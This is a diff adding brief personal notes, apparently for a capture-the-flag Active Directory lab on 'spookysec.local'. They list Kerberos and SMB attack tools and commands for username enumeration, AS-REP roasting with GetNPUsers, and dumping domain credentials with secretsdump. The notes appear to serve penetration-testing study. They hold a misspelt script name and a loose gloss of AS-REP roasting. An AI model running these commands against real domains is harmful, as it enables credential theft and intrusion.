@@ -1,0 +1,21 @@
+ENUM KERBEROS / AD
+
+https://github.com/ropnop/kerbrute
+put ip in /etc/hosts as spookysec.local
+
+WORKING WITH SMB SHARES
+
+TOOLS :
+	suite Impacket
+	Enum4Linux
+	evil-winrm
+	kerbrute
+
+ENUM USERNAMES
+└─# kerbrute userenum -d spookysec.local --dc spookysec.local usernameList.txt
+
+ENUM ROASTABLE USERS (i.e. can log without passwords)
+└─# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py <dc-name>/<username> -no-pass
+
+DUMP
+─# python3 /usr/share/doc/python3-impacket/examples/secretdump.py -just-dc <username>@<dc-name>
